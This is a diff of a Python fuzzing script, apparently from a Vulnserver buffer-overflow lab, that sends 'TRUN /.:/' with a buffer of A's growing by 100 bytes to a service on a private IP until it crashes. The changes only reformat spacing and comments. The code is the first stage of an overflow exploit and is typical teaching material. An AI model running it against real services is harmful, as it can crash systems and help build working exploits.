@@ -24,12 +24,12 @@ Trying to see how big we can make our message, before it crashes.
 '''
 while True:		# as long as true, this loop will keep running.
 	try:
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Establish connection
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Establish connection
 		s.connect(('192.168.1.1', 9999)) 	# Connection to this IP, and port
 		s.send(('TRUN /.:/' + buffer)) 		# Send this message + buffer (message + 100 A's)
-		s.close() 	# Close that connection
-		sleep(1) 	# Sleep for a second
-		buffer = buffer + "A"*100 	# Append buffer, with another 100 A's  100 --> 200 -->
+		s.close() 							# Close that connection
+		sleep(1) 							# Sleep for a second
+		buffer = buffer + "A"*100 			# Append buffer, with another 100 A's  100 --> 200 -->
 
 	except:
 		print("Fuzzing crashed at %s bytes" % (str(len(buffer))))
